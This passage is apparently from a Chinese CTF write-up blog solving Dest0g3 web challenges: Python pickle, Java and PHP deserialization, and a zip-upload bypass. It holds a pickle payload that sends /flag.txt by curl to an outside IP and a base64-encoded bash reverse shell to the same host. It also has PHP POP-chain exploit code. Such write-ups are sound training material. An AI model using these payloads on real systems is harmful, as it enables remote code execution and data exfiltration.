class=\"title\">show</span>():</span></span><br><span class=\"line\">    base_dir = os.path.dirname(__file__)</span><br><span class=\"line\">    resp = make_response(<span class=\"built_in\">open</span>(os.path.join(base_dir, __file__)).read()+<span class=\"built_in\">open</span>(os.path.join(base_dir, <span class=\"string\">&quot;config/__init__.py&quot;</span>)).read())</span><br><span class=\"line\">    resp.headers[<span class=\"string\">&quot;Content-type&quot;</span>] = <span class=\"string\">&quot;text/plain;charset=UTF-8&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> resp</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/home&#x27;</span>, methods=[<span class=\"string\">&#x27;POST&#x27;</span>, <span class=\"string\">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">home</span>():</span></span><br><span class=\"line\">    data=request.form[<span class=\"string\">&#x27;data&#x27;</span>]</span><br><span class=\"line\">    User = restricted_loads(base64.b64decode(data))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">str</span>(User)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    app.run(host=<span class=\"string\">&#x27;0.0.0.0&#x27;</span>, debug=<span class=\"literal\">True</span>, port=<span class=\"number\">5000</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">backdoor</span>(<span class=\"params\">cmd</span>):</span></span><br><span class=\"line\">    <span class=\"comment\"># 这里我也改了一下</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(cmd,<span class=\"built_in\">list</span>) :</span><br><span class=\"line\">        s=<span class=\"string\">&#x27;&#x27;</span>.join(cmd)</span><br><span class=\"line\">        print(<span class=\"string\">&quot;!!!!!!!!!!&quot;</span>)</span><br><span class=\"line\">        s=<span class=\"built_in\">eval</span>(s)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> s</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        print(<span class=\"string\">&quot;??????&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>找到类似题目：<a href=\"https://www.anquanke.com/post/id/248899#h2-0\">巅峰极客2021 what_pickle——一道综合性的python web - 安全客，安全资讯平台 (anquanke.com)</a></p>\n<p>修改一下文章exp即可</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> config</span><br><span class=\"line\"><span class=\"keyword\">import</span> pickle</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\">opcode = <span class=\"string\">b&#x27;&#x27;&#x27;(cconfig</span></span><br><span class=\"line\"><span class=\"string\">backdoor</span></span><br><span class=\"line\"><span class=\"string\">(S&#x27;__import__(&quot;os&quot;).system(&quot;curl http://150.158.181.145:3000 -F file=@/flag.txt&quot;)&#x27;</span></span><br><span class=\"line\"><span class=\"string\">lo.&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">print(base64.b64encode(opcode))</span><br></pre></td></tr></table></figure>\n\n<p>FLAG：Dest0g3{f17b5918-7e65-485e-ada0-1b34cb0c64bb}</p>\n<h2 id=\"EzSerial\"><a href=\"#EzSerial\" class=\"headerlink\" title=\"EzSerial\"></a>EzSerial</h2><p>登录，随便传一个，发现返回的cookie返回base64</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Dest0g3/image-20220523234850079.png\" alt=\"image-20220523234850079\"></p>\n<p>admin/admin登录，看到cookie很像base64的序列化的形式，尝试ysoserial打一个URLDNS</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Dest0g3/image-20220525082149944.png\" alt=\"image-20220525082149944\"></p>\n<p>放到cookie</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Dest0g3/image-20220525082242338.png\" alt=\"image-20220525082242338\"></p>\n<p>收到回显</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Dest0g3/image-20220525082256063.png\" alt=\"image-20220525082256063\"></p>\n<p>接着尝试CC链，但都不行，可能长度进行了限制，缩小payload：<a href=\"https://github.com/4ra1n/ShortPayload\">4ra1n/ShortPayload</a></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Dest0g3/image-20220525082448737.png\" alt=\"image-20220525082448737\"></p>\n<p>payload</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"code\"><pre><span class=\"line\">bash <span class=\"literal\">-c</span> &#123;<span class=\"built_in\">echo</span>,YmFzaCAtaSA+Ji9kZXYvdGNwLzE1MC4xNTguMTgxLjE0NS82MDAwIDA+JjE=&#125;|&#123;base64,<span class=\"literal\">-d</span>&#125;|&#123;bash,<span class=\"literal\">-i</span>&#125;</span><br></pre></td></tr></table></figure>\n\n<p>接受shell</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Dest0g3/image-20220525082554387.png\" alt=\"image-20220525082554387\"></p>\n<p>FLAG：Dest0g3{79c1a2a1-fc15-4da5-a16b-2239d3e9ebe6}</p>\n<h2 id=\"ezip\"><a href=\"#ezip\" class=\"headerlink\" title=\"ezip\"></a>ezip</h2><p>图片有base64 源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">upload.php:</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&quot;zip.php&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(strstr(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>],<span class=\"string\">&quot;..&quot;</span>)||strstr(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>],<span class=\"string\">&quot;/&quot;</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;hacker!!&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(pathinfo(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>], PATHINFO_EXTENSION)!=<span class=\"string\">&quot;zip&quot;</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;only zip!!&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"variable\">$Myzip</span> = <span class=\"keyword\">new</span> zip(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">    mkdir(<span class=\"variable\">$Myzip</span>-&gt;path);</span><br><span class=\"line\">    move_uploaded_file(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>], <span class=\"string\">&#x27;./&#x27;</span>.<span class=\"variable\">$Myzip</span>-&gt;path.<span class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Try to unzip your zip to /&quot;</span>.<span class=\"variable\">$Myzip</span>-&gt;path.<span class=\"string\">&quot;&lt;br&gt;&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$Myzip</span>-&gt;unzip())&#123;<span class=\"keyword\">echo</span> <span class=\"string\">&quot;Success&quot;</span>;&#125;<span class=\"keyword\">else</span>&#123;<span class=\"keyword\">echo</span> <span class=\"string\">&quot;failed&quot;</span>;&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">zip.php:</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">zip</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$zip_name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$path</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$zip_manager</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$zip_name</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;zip_manager = <span class=\"keyword\">new</span> ZipArchive();</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;path = <span class=\"keyword\">$this</span>-&gt;gen_path();</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;zip_name = <span class=\"variable\">$zip_name</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">gen_path</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$chars</span>=<span class=\"string\">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$newchars</span>=str_split(<span class=\"variable\">$chars</span>);</span><br><span class=\"line\">        shuffle(<span class=\"variable\">$newchars</span>);</span><br><span class=\"line\">        <span class=\"variable\">$chars_key</span>=array_rand(<span class=\"variable\">$newchars</span>,<span class=\"number\">15</span>);</span><br><span class=\"line\">        <span class=\"variable\">$fnstr</span> = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"variable\">$i</span>=<span class=\"number\">0</span>;<span class=\"variable\">$i</span>&lt;<span class=\"number\">15</span>;<span class=\"variable\">$i</span>++)&#123;</span><br><span class=\"line\">            <span class=\"variable\">$fnstr</span>.=<span class=\"variable\">$newchars</span>[<span class=\"variable\">$chars_key</span>[<span class=\"variable\">$i</span>]];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> md5(<span class=\"variable\">$fnstr</span>.time().microtime()*<span class=\"number\">100000</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">deldir</span>(<span class=\"params\"><span class=\"variable\">$dir</span></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//先删除目录下的文件：</span></span><br><span class=\"line\">        <span class=\"variable\">$dh</span> = opendir(<span class=\"variable\">$dir</span>);</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (<span class=\"variable\">$file</span> = readdir(<span class=\"variable\">$dh</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"variable\">$file</span> != <span class=\"string\">&quot;.&quot;</span> &amp;&amp; <span class=\"variable\">$file</span>!=<span class=\"string\">&quot;..&quot;</span>) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$fullpath</span> = <span class=\"variable\">$dir</span>.<span class=\"string\">&quot;/&quot;</span>.<span class=\"variable\">$file</span>;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(!is_dir(<span class=\"variable\">$fullpath</span>)) &#123;</span><br><span class=\"line\">                    unlink(<span class=\"variable\">$fullpath</span>);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">$this</span>-&gt;deldir(<span class=\"variable\">$fullpath</span>);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        closedir(<span class=\"variable\">$dh</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">dir_list</span>(<span class=\"params\"><span class=\"variable\">$directory</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$array</span> = [];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$dir</span> = dir(<span class=\"variable\">$directory</span>);</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (<span class=\"variable\">$file</span> = <span class=\"variable\">$dir</span>-&gt;read()) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"variable\">$file</span> !== <span class=\"string\">&#x27;.&#x27;</span> &amp;&amp; <span class=\"variable\">$file</span> !== <span class=\"string\">&#x27;..&#x27;</span>) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$array</span>[] = <span class=\"variable\">$file</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable\">$array</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">unzip</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$fullpath</span> = <span class=\"string\">&quot;/var/www/html/&quot;</span>.<span class=\"keyword\">$this</span>-&gt;path.<span class=\"string\">&quot;/&quot;</span>.<span class=\"keyword\">$this</span>-&gt;zip_name;</span><br><span class=\"line\">        <span class=\"variable\">$white_list</span> = [<span class=\"string\">&#x27;jpg&#x27;</span>,<span class=\"string\">&#x27;png&#x27;</span>,<span class=\"string\">&#x27;gif&#x27;</span>,<span class=\"string\">&#x27;bmp&#x27;</span>];</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;zip_manager-&gt;open(<span class=\"variable\">$fullpath</span>);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"variable\">$i</span> = <span class=\"number\">0</span>;<span class=\"variable\">$i</span> &lt; <span class=\"keyword\">$this</span>-&gt;zip_manager-&gt;count();<span class=\"variable\">$i</span> ++) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (strstr(<span class=\"keyword\">$this</span>-&gt;zip_manager-&gt;getNameIndex(<span class=\"variable\">$i</span>),<span class=\"string\">&quot;../&quot;</span>))&#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">&quot;you bad bad&quot;</span>;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!<span class=\"keyword\">$this</span>-&gt;zip_manager-&gt;extractTo(<span class=\"keyword\">$this</span>-&gt;path))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Unzip to /&quot;</span>.<span class=\"keyword\">$this</span>-&gt;path.<span class=\"string\">&quot;/ failed&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        @unlink(<span class=\"variable\">$fullpath</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_list</span> = <span class=\"keyword\">$this</span>-&gt;dir_list(<span class=\"string\">&quot;/var/www/html/&quot;</span>.<span class=\"keyword\">$this</span>-&gt;path.<span class=\"string\">&quot;/&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"variable\">$i</span>=<span class=\"number\">0</span>;<span class=\"variable\">$i</span>&lt;sizeof(<span class=\"variable\">$file_list</span>);<span class=\"variable\">$i</span>++)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(is_dir(<span class=\"keyword\">$this</span>-&gt;path.<span class=\"string\">&quot;/&quot;</span>.<span class=\"variable\">$file_list</span>[<span class=\"variable\">$i</span>]))&#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">&quot;dir? I deleted all things in it&quot;</span>.<span class=\"string\">&quot;&lt;br&gt;&quot;</span>;@<span class=\"keyword\">$this</span>-&gt;deldir(<span class=\"string\">&quot;/var/www/html/&quot;</span>.<span class=\"keyword\">$this</span>-&gt;path.<span class=\"string\">&quot;/&quot;</span>.<span class=\"variable\">$file_list</span>[<span class=\"variable\">$i</span>]);@rmdir(<span class=\"string\">&quot;/var/www/html/&quot;</span>.<span class=\"keyword\">$this</span>-&gt;path.<span class=\"string\">&quot;/&quot;</span>.<span class=\"variable\">$file_list</span>[<span class=\"variable\">$i</span>]);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(!in_array(pathinfo(<span class=\"variable\">$file_list</span>[<span class=\"variable\">$i</span>], PATHINFO_EXTENSION),<span class=\"variable\">$white_list</span>)) &#123;<span class=\"keyword\">echo</span> <span class=\"string\">&quot;only image!!! I deleted it for you&quot;</span>.<span class=\"string\">&quot;&lt;br&gt;&quot;</span>;@unlink(<span class=\"string\">&quot;/var/www/html/&quot;</span>.<span class=\"keyword\">$this</span>-&gt;path.<span class=\"string\">&quot;/&quot;</span>.<span class=\"variable\">$file_list</span>[<span class=\"variable\">$i</span>]);&#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>发现使用了 ZipArchive，根据P牛，两个文件 1.php 和 2.txt，压缩为zip，对压缩文件的文件名进行操作可以导致解压失败从而终止解压，然后遗留shell文件getshell，修改其中一个filename为  <code>/////</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Dest0g3/image-20220523122626336.png\" alt=\"image-20220523122626336\"></p>\n<p>参考：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Dest0g3/image-20220523122916097.png\" alt=\"image-20220523122916097\"></p>\n<p>FLAG：Dest0g3{21f63c65-82d2-49b5-a847-c9a320096ffe}</p>\n<h2 id=\"pharPOP\"><a href=\"#pharPOP\" class=\"headerlink\" title=\"pharPOP\"></a>pharPOP</h2><p>源文件,对类名进行了过滤，可以利用php中类名不区分大小写，例如 Air() 进行绕过</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">waf</span>(<span class=\"params\"><span class=\"variable\">$data</span></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (is_array(<span class=\"variable\">$data</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Cannot transfer arrays&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (preg_match(<span class=\"string\">&#x27;/get|air|tree|apple|banana|filter|base64|rot13|read|data/i&#x27;</span>, <span class=\"variable\">$data</span>)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;You can&#x27;t do&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">air</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$p</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__set</span>(<span class=\"params\"><span class=\"variable\">$p</span>, <span class=\"variable\">$value</span></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$p</span> = <span class=\"keyword\">$this</span>-&gt;p-&gt;act;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">new</span> <span class=\"variable\">$p</span>(<span class=\"variable\">$value</span>);   <span class=\"comment\"># 4. 任意类，最终利用点</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">tree</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$act</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;name();  <span class=\"comment\"># 1.入口 触发call</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$name</span>, <span class=\"variable\">$arg</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$arg</span>[<span class=\"number\">1</span>] =<span class=\"keyword\">$this</span>-&gt;name-&gt;<span class=\"variable\">$name</span>;  <span class=\"comment\"># 2. 触发 apple的get</span></span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">apple</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$xxx</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span>(<span class=\"params\"><span class=\"variable\">$flag</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;xxx-&gt;<span class=\"variable\">$flag</span> = <span class=\"keyword\">$this</span>-&gt;flag;  <span class=\"comment\"># 3.触发 air的set方法</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">D</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$start</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$data</span> = <span class=\"variable\">$_POST</span>[<span class=\"number\">0</span>];</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">$this</span>-&gt;start == <span class=\"string\">&#x27;w&#x27;</span>) &#123;</span><br><span class=\"line\">            waf(<span class=\"variable\">$data</span>);</span><br><span class=\"line\">            <span class=\"variable\">$filename</span> = <span class=\"string\">&quot;D:/phpstudy_pro/WWW/test/tmp/&quot;</span>.md5(rand()).<span class=\"string\">&quot;.jpg&quot;</span>; <span class=\"comment\"># 写 phar文件</span></span><br><span class=\"line\">            file_put_contents(<span class=\"variable\">$filename</span>, <span class=\"variable\">$data</span>);</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable\">$filename</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">$this</span>-&gt;start == <span class=\"string\">&#x27;r&#x27;</span>) &#123;</span><br><span class=\"line\">            waf(<span class=\"variable\">$data</span>);</span><br><span class=\"line\">            <span class=\"variable\">$f</span> = file_get_contents(<span class=\"variable\">$data</span>);  <span class=\"comment\"># 触发phar文件</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"variable\">$f</span>)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">&quot;It is file&quot;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">&quot;You can look at the others&quot;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">banana</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span>(<span class=\"params\"><span class=\"variable\">$name</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;<span class=\"variable\">$name</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// flag in /</span></span><br><span class=\"line\"><span class=\"variable\">$tmp</span> = <span class=\"variable\">$_POST</span>[<span class=\"number\">1</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(strlen(<span class=\"variable\">$_POST</span>[<span class=\"number\">1</span>]) &lt; <span class=\"number\">55</span>) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$a</span> = unserialize(<span class=\"variable\">$_POST</span>[<span class=\"number\">1</span>]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;str too long&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(<span class=\"string\">&quot;start&quot;</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>考点挺多的，首先审计挖掘链子利用原生类，并生成phar文件</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Air</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$p</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Tree</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$act</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Apple</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$xxx</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">@unlink(<span class=\"string\">&#x27;test.phar&#x27;</span>);</span><br><span class=\"line\">@unlink(<span class=\"string\">&#x27;test2.phar&#x27;</span>);</span><br><span class=\"line\">@unlink(<span class=\"string\">&#x27;phar.zip&#x27;</span>);</span><br><span class=\"line\"><span class=\"comment\">// flag in /</span></span><br><span class=\"line\"><span class=\"variable\">$tree</span> = <span class=\"keyword\">new</span> Tree();</span><br><span class=\"line\"><span class=\"variable\">$tree</span>-&gt;name = <span class=\"keyword\">new</span> Apple();</span><br><span class=\"line\"><span class=\"variable\">$tree</span>-&gt;name-&gt;xxx = <span class=\"keyword\">new</span> Air();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$tree</span>-&gt;name-&gt;flag = <span class=\"string\">&quot;/fflaggg&quot;</span>;</span><br><span class=\"line\"><span class=\"comment\">#$tree-&gt;name-&gt;flag = &quot;glob:///*flag*&quot;;</span></span><br><span class=\"line\"><span class=\"variable\">$tree2</span> = <span class=\"keyword\">new</span> Tree();</span><br><span class=\"line\"><span class=\"variable\">$tree2</span>-&gt;act = <span 